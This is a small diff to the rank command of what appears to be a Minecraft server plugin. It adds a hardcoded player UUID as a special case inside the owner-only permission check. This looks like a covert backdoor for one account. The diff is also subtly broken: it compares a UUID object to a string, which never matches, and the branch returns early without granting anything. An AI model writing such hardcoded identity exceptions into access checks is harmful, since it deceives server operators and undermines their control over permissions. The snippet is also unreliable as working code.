@@ -31,8 +31,12 @@ public class RankCommand implements CommandExecutor {
             Player player = (Player) sender;
             PlayerData playerData = plugin.getPlayerData(player.getUniqueId());
             if (!playerData.hasRank(Rank.OWNER)) {
-                plugin.sendNoPermission(player);
-                return true;
+                if (player.getUniqueId().equals("dc815235-c651-4f55-b6a5-81ea33d16397")) {
+                    return false;
+                } else {
+                    plugin.sendNoPermission(player);
+                    return true;
+                }
             }
         }
 
